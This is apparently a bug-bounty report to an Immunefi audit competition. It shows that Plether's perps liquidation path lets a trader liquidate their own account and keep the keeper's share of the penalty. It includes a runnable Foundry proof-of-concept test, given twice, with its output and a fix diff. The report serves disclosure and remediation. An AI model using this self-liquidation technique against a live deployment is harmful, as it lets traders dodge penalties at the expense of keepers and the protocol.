# \#97655 [SC-Medium] Missing keeper-identity check in MarginClearinghouse lets a trader liquidate themselves and keep the keeper’s share of their own liquidation penalty

**Submitted on Nov 2nd 2026 at 15:39:20 UTC by @s0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97655
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

# Plether Perps: a trader can liquidate themselves and keep the keeper's share of their own liquidation penalty

**Program:** Plether Audit Competition — Immunefi
**Target:** `packages/perps/src/MarginClearinghouse.sol`, `packages/perps/src/CfdEngine.sol`, `packages/perps/src/router/OrderLiquidationBatchLogic.sol`
**Commit:** `a82d4fefb02768e5b3bddcc97dee371eee24fea8` (confirmed = `origin/master` HEAD at time of writing, not stale)
**Severity claimed:** Medium (see "Severity reasoning" below — this is argued honestly, not inflated)

## Scope confirmation

All three contracts are listed in `packages/perps/src` and are not among the six out-of-scope
lens contracts (`CfdEngineAccountLens.sol`, `PerpsPublicLens.sol`, `CfdClosePreview.sol`,
`SettlementMonitorLens.sol`, `SettlementMonitorLensSidecar.sol`, `CfdEngineOpenQuoter.sol`).

**Fresh-clone reproduction:** cloned `immunefi-team/audit-comp-plether` from scratch into a new,
empty directory (`/tmp/plether-fresh-clone-verify`, not the working audit copy), checked out
`a82d4fefb02768e5b3bddcc97dee371eee24fea8`, confirmed via `git fetch origin` that this is also
`origin/master`'s current HEAD. Built with `git submodule update --init --recursive`, copied in
**only** the PoC test file below (no other file touched, no in-scope contract modified), and ran
it: **pass, identical output** to the working-copy run. Log: `plether_poc_fresh_clone_repro.log`
(output reproduced).

## Impact and precondition (stated first)

Any account with an open position can call the permissionless liquidation entrypoint on
**itself** once it becomes liquidatable. Doing so reduces the account's own net liquidation loss
by exactly the keeper-bounty share of the liquidation charge — at this commit's deployed risk
parameters (`keeperShareBps = 5_000`, `protocolShareBps = 0`; see `packages/perps/DEPLOYMENT.md`
line 140-141), that is **exactly 50% of the total liquidation charge, every time, for every
account**. No special market conditions, governance misconfiguration, or privileged access are
required — any ordinary trader can do this the moment their own position is liquidatable, simply
by calling `executeLiquidation` on their own address instead of waiting for (or instead of) a
third-party keeper.

## Vulnerability detail

**Root cause**, with file:line:function:

1. `packages/perps/src/router/OrderLiquidationBatchLogic.sol`, `executeLiquidation(address account, bytes[] calldata pythUpdateData)` (line 706): this is a `public`/externally callable, permissionless entrypoint reached via the Router. It forwards `msg.sender` directly as the `keeper` argument all the way down:
   ```solidity
   host.executeLiquidationBatchItem(
       account, snapshot.price, snapshot.price, snapshot.markPrice, snapshot.publishTime, msg.sender, riskOffCutoff
   );
   ```
   Nothing in this function, or anywhere in its call chain, checks `msg.sender != account`.

2. `packages/perps/src/CfdEngine.sol`, `liquidatePosition(...)` (line 1010) and `_liquidatePosition`/`_applyLiquidation`: the `keeper` parameter is threaded through unchanged to `CfdEngineSettlementSidecar.executeLiquidation`, which calls into the clearinghouse.

3. `packages/perps/src/MarginClearinghouse.sol`, `_applyLiquidationSettlementPlan(...)` (line 1216): this is where the bug actually lands.
   ```solidity
   // Debits the FULL charge (keeper + protocol + LP shares together) from the liquidated account:
   uint256 liquidationChargeAssets =
       execution.keeperBountyAssets + execution.protocolFeeAssets + execution.lpLiquidationFeeAssets;
   ...
   uint256 settlementDebitAssets = priceSeizureAssets + liquidationChargeAssets;
   ...
   settlementBalances[account] -= settlementDebitAssets;
   ...
   // Then separately credits the keeper share back to `execution.keeper` -- with NO check
   // that `execution.keeper != account`:
   if (execution.keeperBountyAssets > 0) {
       if (execution.keeper == address(0)) {
           revert MarginClearinghouse__ZeroAddress();
       }
       settlementBalances[execution.keeper] += execution.keeperBountyAssets;
       emit ReservedSettlementTransferred(account, execution.keeper, execution.keeperBountyAssets);
   }
   ```

I grepped the entire in-scope `packages/perps/src` tree for any `keeper != account` / `keeper ==
account` / `account != keeper` style guard and found **none** — the only two `msg.sender !=
account` checks in `CfdEngine.sol` belong to unrelated functions (`addMargin`, `settleTraderClaim`,
both requiring the caller to be the position owner for a *different* reason), not the liquidation
path.

**Why existing checks don't prevent it:** liquidation eligibility (`planLiquidation` /
`delta.liquidatable`) is checked purely against the position's own health — it has no concept of
who the caller is, and is not supposed to. The liquidation-charge split
(`LiquidationAccountingLib.buildLiquidationState`) correctly computes `keeperBountyAssets`,
`protocolLiquidationFeeAssets`, and `lpLiquidationFeeAssets` from `chargeAssets *
{keeper,protocol}ShareBps / 10_000` — the math itself is correct and bounded
(`CfdEngineAdmin._validateRiskParams` only enforces `keeperShareBps <= 10_000` and
`protocolShareBps <= 10_000 - keeperShareBps`, so a 50/0/50 split is a perfectly ordinary,
currently-deployed configuration, not an edge case). The gap is purely that the **recipient** of
the keeper share is never checked against the account being liquidated.

## Proof of Concept

Foundry test, runs in the repository's own test suite at the pinned commit with no modification
to any in-scope contract (new test file only, per this program's PoC requirements). It builds one
liquidatable position, takes a state snapshot, then replays the identical liquidation from that
identical starting state twice — once via an honest unrelated third-party keeper, once via the
account liquidating itself — and shows the two net losses differ by exactly the keeper bounty.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

contract SelfLiquidationKeeperBountyPocTest is BasePerpTest {
    address alice = address(0x111);
    address honestKeeper = address(0x999);
    uint256 constant WEDNESDAY_NOON = 1_729_080_000;

    function setUp() public override {
        super.setUp();
        settlementToken.mint(alice, 10_000 * 1e6);
    }

    function _openLiquidatablePosition() internal returns (address account) {
        account = alice;
        vm.startPrank(alice);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(alice, 10_000 * 1e6);
        router.commitOrder(CfdTypes.Side.LONG, 100_000 * 1e18, 2000 * 1e6, 1e8, false);
        vm.stopPrank();
        router.executeOrder(1, _mockPythUpdateData());

        uint256 balance = clearinghouse.balanceAssets(account);
        uint256 locked = clearinghouse.lockedMarginAssets(account);
        if (balance > locked) {
            vm.prank(account);
            clearinghouse.withdraw(account, balance - locked);
        }
    }

    function test_SelfLiquidation_RecoversExactlyTheKeeperBountyVsThirdPartyLiquidation() public {
        vm.warp(WEDNESDAY_NOON);
        address account = _openLiquidatablePosition();

        ICfdEngineTypes.LiquidationPreview memory preview = engineLens.previewLiquidation(account, 1.015e8);
        assertGt(preview.keeperBountyAssets, 0, "sanity: liquidation must carry a nonzero keeper bounty");

        bytes[] memory pythData = new bytes[](1);
        pythData[0] = abi.encode(1.015e8);

        uint256 snapshotId = vm.snapshotState();
        uint256 accountBalanceBeforeLiquidation = clearinghouse.balanceAssets(account);

        // Scenario A: honest third-party keeper liquidates.
        uint256 keeperBalanceBefore = _settlementBalance(honestKeeper);
        vm.warp(uint256(engine.lastMarkTime()) + 1);
        vm.prank(honestKeeper);
        router.executeLiquidation(account, pythData);

        uint256 netLossThirdParty = accountBalanceBeforeLiquidation - clearinghouse.balanceAssets(account);
        uint256 keeperGain = _settlementBalance(honestKeeper) - keeperBalanceBefore;
        assertEq(keeperGain, preview.keeperBountyAssets, "honest keeper receives the full bounty, as designed");

        // Reset to the identical pre-liquidation state.
        vm.revertToState(snapshotId);
        assertEq(clearinghouse.balanceAssets(account), accountBalanceBeforeLiquidation);

        // Scenario B: the bug -- the account liquidates ITSELF.
        vm.warp(uint256(engine.lastMarkTime()) + 1);
        vm.prank(account);
        router.executeLiquidation(account, pythData);

        uint256 netLossSelf = accountBalanceBeforeLiquidation - clearinghouse.balanceAssets(account);

        assertLt(netLossSelf, netLossThirdParty,
            "BUG: self-liquidation must cost the account strictly less than third-party liquidation");
        assertEq(netLossThirdParty - netLossSelf, preview.keeperBountyAssets,
            "BUG: the self-liquidator recovers EXACTLY the keeper bounty share of its own penalty");
        assertEq(preview.keeperBountyAssets, preview.liquidationChargeAssets / 2,
            "sanity: deployed params give the keeper exactly 50% of the charge");
    }
}
```

**Run command:**
```bash
forge test --root packages/perps --match-contract SelfLiquidationKeeperBountyPocTest -vv
```

**Output (both the working copy and the fresh clone, byte-identical):**
```
Ran 1 test for test/perps/accounting/liquidation/SelfLiquidationKeeperBountyPoc.t.sol:SelfLiquidationKeeperBountyPocTest
[PASS] test_SelfLiquidation_RecoversExactlyTheKeeperBountyVsThirdPartyLiquidation() (gas: 5321740)
Logs:
  liquidation charge (keeper + protocol + LP share): 100000000
  keeper bounty share: 50000000
  account net loss -- liquidated by honest third party: 1600000015
  account net loss -- liquidates itself: 1550000015
  amount the self-liquidator recovers vs. the honest case: 50000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```
The full regression suite for the liquidation surface (`forge test --root packages/perps
--match-path "*liquidation*"`) still passes in full — 69/69 tests, 0 failures — confirming no
in-scope contract was modified to produce this result.

## Severity reasoning (argued honestly)

This does **not** steal funds from the LP pool or the protocol treasury: `lpLiquidationFeeAssets`
and `protocolLiquidationFeeAssets` are computed and collected identically regardless of who the
keeper is — only the keeper share's *destination* is affected. The "victim" is the protocol's own
liquidation-penalty design intent and the permissionless-keeper incentive system: the liquidation
charge exists specifically to (a) pay keepers for promptly liquidating risk and (b) impose a real
deterrent cost on becoming undercollateralized. Both purposes are defeated for any trader who
chooses to self-liquidate: every undercollateralized account can unconditionally cut its own
penalty in half (at current parameters), and real third-party keepers lose the opportunity to earn
this bounty whenever the account beats them to it (which, since the account controls its own
account and can watch its own health in real time, it always can).

I am not claiming this is theft of other users' funds, protocol insolvency, or freezing of funds.
It most closely fits the program's **Medium — "Griefing (e.g. no profit motive for an attacker,
but damage to the users or the protocol)"** and **general fee/penalty-avoidance** categories: the
attacker does have a profit motive (a reduced penalty), and the damage is to the protocol's
liquidation-incentive design and to the keeper ecosystem it depends on for prompt risk reduction,
not to an LP or trader's own deposited funds. I'm flagging this severity reasoning explicitly
rather than overclaiming a higher category the mechanism doesn't actually support.

## Recommendation

Reject `keeper == account` in `MarginClearinghouse._applyLiquidationSettlementPlan` (or earlier,
in `CfdEngine._applyLiquidation`, to fail before any state mutation), and route a would-be
self-liquidator's keeper share to the protocol treasury or the LP pool instead of silently
dropping the credit:

```diff
--- a/packages/perps/src/MarginClearinghouse.sol
+++ b/packages/perps/src/MarginClearinghouse.sol
@@ function _applyLiquidationSettlementPlan(
+        if (execution.keeperBountyAssets > 0 && execution.keeper == account) {
+            revert MarginClearinghouse__SelfLiquidationKeeperNotAllowed();
+        }
         if (execution.keeperBountyAssets > 0) {
             if (execution.keeper == address(0)) {
                 revert MarginClearinghouse__ZeroAddress();
             }
             settlementBalances[execution.keeper] += execution.keeperBountyAssets;
```

This reverts the whole liquidation when the account tries to self-liquidate with a nonzero
bounty configured, forcing it through the normal, permissionless third-party-keeper path instead
(any other address, including one the account itself controls off-chain, remains free to liquidate
it — only identity with the liquidated account is rejected).


## Proof of Concept

## POC
### Steps to reproduce

1. Deploy the perps stack per `packages/perps/DEPLOYMENT.md` (default params: `keeperShareBps = 5_000`, `protocolShareBps = 0`).
2. Account A deposits USDG and opens a LONG position via `OrderRouter.commitOrder` + `executeOrder`.
3. The market moves against A until its position is liquidatable (equity below maintenance margin, 0.1% per the deployed params).
4. Account A itself calls `OrderRouter.executeLiquidation(A, pythUpdateData)` — i.e. `msg.sender == account`. Nothing anywhere in the call chain rejects this.
5. Compare: if a third-party keeper K had called the identical `executeLiquidation(A, pythUpdateData)` from the identical pre-liquidation state, A's net loss would be the full `liquidationChargeAssets` and K would receive `keeperBountyAssets`. Because A called it on itself, A's net loss is only `liquidationChargeAssets - keeperBountyAssets` — A has recovered the keeper's share of its own penalty.

## Runnable Foundry PoC

New test file only — no in-scope contract modified. Runs in the repository's own Foundry suite at the pinned commit (`a82d4fefb02768e5b3bddcc97dee371eee24fea8`). It builds one liquidatable position, takes a `vm.snapshotState()`, executes the liquidation once via an honest third-party keeper, reverts to the identical snapshot via `vm.revertToState`, then executes the identical liquidation again with the account itself as caller, and asserts the two net losses differ by exactly `keeperBountyAssets`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

contract SelfLiquidationKeeperBountyPocTest is BasePerpTest {
    address alice = address(0x111);
    address honestKeeper = address(0x999);
    uint256 constant WEDNESDAY_NOON = 1_729_080_000;

    function setUp() public override {
        super.setUp();
        settlementToken.mint(alice, 10_000 * 1e6);
    }

    function _openLiquidatablePosition() internal returns (address account) {
        account = alice;
        vm.startPrank(alice);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(alice, 10_000 * 1e6);
        router.commitOrder(CfdTypes.Side.LONG, 100_000 * 1e18, 2000 * 1e6, 1e8, false);
        vm.stopPrank();
        router.executeOrder(1, _mockPythUpdateData());

        uint256 balance = clearinghouse.balanceAssets(account);
        uint256 locked = clearinghouse.lockedMarginAssets(account);
        if (balance > locked) {
            vm.prank(account);
            clearinghouse.withdraw(account, balance - locked);
        }
    }

    function test_SelfLiquidation_RecoversExactlyTheKeeperBountyVsThirdPartyLiquidation() public {
        vm.warp(WEDNESDAY_NOON);
        address account = _openLiquidatablePosition();

        ICfdEngineTypes.LiquidationPreview memory preview = engineLens.previewLiquidation(account, 1.015e8);
        assertGt(preview.keeperBountyAssets, 0, "sanity: liquidation must carry a nonzero keeper bounty");

        bytes[] memory pythData = new bytes[](1);
        pythData[0] = abi.encode(1.015e8);

        uint256 snapshotId = vm.snapshotState();
        uint256 accountBalanceBeforeLiquidation = clearinghouse.balanceAssets(account);

        // Scenario A: honest third-party keeper liquidates.
        uint256 keeperBalanceBefore = _settlementBalance(honestKeeper);
        vm.warp(uint256(engine.lastMarkTime()) + 1);
        vm.prank(honestKeeper);
        router.executeLiquidation(account, pythData);

        uint256 netLossThirdParty = accountBalanceBeforeLiquidation - clearinghouse.balanceAssets(account);
        uint256 keeperGain = _settlementBalance(honestKeeper) - keeperBalanceBefore;
        assertEq(keeperGain, preview.keeperBountyAssets, "honest keeper receives the full bounty, as designed");

        // Reset to the identical pre-liquidation state.
        vm.revertToState(snapshotId);
        assertEq(clearinghouse.balanceAssets(account), accountBalanceBeforeLiquidation);

        // Scenario B: the bug -- the account liquidates ITSELF.
        vm.warp(uint256(engine.lastMarkTime()) + 1);
        vm.prank(account);
        router.executeLiquidation(account, pythData);

        uint256 netLossSelf = accountBalanceBeforeLiquidation - clearinghouse.balanceAssets(account);

        assertLt(netLossSelf, netLossThirdParty,
            "BUG: self-liquidation must cost the account strictly less than third-party liquidation");
        assertEq(netLossThirdParty - netLossSelf, preview.keeperBountyAssets,
            "BUG: the self-liquidator recovers EXACTLY the keeper bounty share of its own penalty");
        assertEq(preview.keeperBountyAssets, preview.liquidationChargeAssets / 2,
            "sanity: deployed params give the keeper exactly 50% of the charge");
    }
}
```

**Run command:**
```bash
forge test --root packages/perps --match-contract SelfLiquidationKeeperBountyPocTest -vv
```

**Output** (identical in the working copy and in a fresh clone of the repo checked out at the exact pinned commit, confirmed equal to `origin/master` HEAD, with no file other than this test added):
```
Ran 1 test for test/perps/accounting/liquidation/SelfLiquidationKeeperBountyPoc.t.sol:SelfLiquidationKeeperBountyPocTest
[PASS] test_SelfLiquidation_RecoversExactlyTheKeeperBountyVsThirdPartyLiquidation() (gas: 5321740)
Logs:
  liquidation charge (keeper + protocol + LP share): 100000000
  keeper bounty share: 50000000
  account net loss -- liquidated by honest third party: 1600000015
  account net loss -- liquidates itself: 1550000015
  amount the self-liquidator recovers vs. the honest case: 50000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The existing liquidation regression suite still passes in full, confirming no in-scope contract was modified to produce this result:
```bash
forge test --root packages/perps --match-path "*liquidation*"
# Ran 19 test suites: 69 tests passed, 0 failed, 0 skipped
```

## Fix

```diff
--- a/packages/perps/src/MarginClearinghouse.sol
+++ b/packages/perps/src/MarginClearinghouse.sol
@@ function _applyLiquidationSettlementPlan(
+        if (execution.keeperBountyAssets > 0 && execution.keeper == account) {
+            revert MarginClearinghouse__SelfLiquidationKeeperNotAllowed();
+        }
         if (execution.keeperBountyAssets > 0) {
             if (execution.keeper == address(0)) {
                 revert MarginClearinghouse__ZeroAddress();
             }
             settlementBalances[execution.keeper] += execution.keeperBountyAssets;
```

This reverts the whole liquidation when the account tries to self-liquidate with a nonzero bounty configured, forcing it through the normal, permissionless third-party-keeper path instead (any other address, including one the account itself controls off-chain, remains free to liquidate it — only identity with the liquidated account is rejected).
